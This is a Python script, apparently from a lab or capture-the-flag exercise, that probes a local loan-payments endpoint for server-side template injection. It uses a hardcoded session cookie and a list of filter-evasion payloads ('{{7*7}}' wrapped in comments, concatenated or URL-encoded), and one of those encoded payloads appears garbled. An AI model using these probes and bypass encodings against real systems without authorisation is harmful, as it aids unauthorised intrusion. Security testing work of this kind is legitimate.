import requests, json, urllib.parse, sys

target = "http://127.0.0.1:32790/total_loan_payments"
cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVlvKQ.Ahoc9Ula-DnHQaF2W1Cj0InvBaA"
headers = {"Cookie": cookie, "User-Agent": "Mozilla/5.0"}

payloads = [
    ("original", "{{7*7}}"),
    ("html_comment", "<!--{{7*7}}-->"),
    ("string_concat", "{{'{{' + '7*7' + '}}'}}"),
    ("fragmented", "{{7*7 }}"),
    ("alternative", "${7*7}"),
    ("url_std", "%7B%7B7*7%7D%7D"),
    ("url_aggr", "%25257B%25257B7*72525257D%25257D")
]

print("Testing GET requests")
for name, payload in payloads:
    try:
        url = f"{target}?param={urllib.parse.quote(payload)}"
        r = requests.get(url, headers=headers, timeout=5)
        executed = "49" in r.text
        filtered = any(w in r.text.lower() for w in ["forbidden","blocked"])
        print(f"GET {name}: s={r.status_code} exec={executed} filter={filtered}")
        if executed: print(f"[!] EXECUTED: {r.text[:150]}")
    except Exception as e:
        print(f"GET {name} error: {e}")

print("\nTesting POST requests")
for name, payload in payloads:
    try:
        h = headers.copy()
        h["Content-Type"] = "application/json"
        r = requests.post(target, headers=h, json={"param": payload}, timeout=5)
        executed = "49" in r.text
        filtered = any(w in r.text.lower() for w in ["forbidden","blocked"])
        print(f"POST {name}: s={r.status_code} exec={executed} filter={filtered}")
        if executed: print(f"[!] EXECUTED: {r.text[:150]}")
    except Exception as e:
        print(f"POST {name} error: {e}")
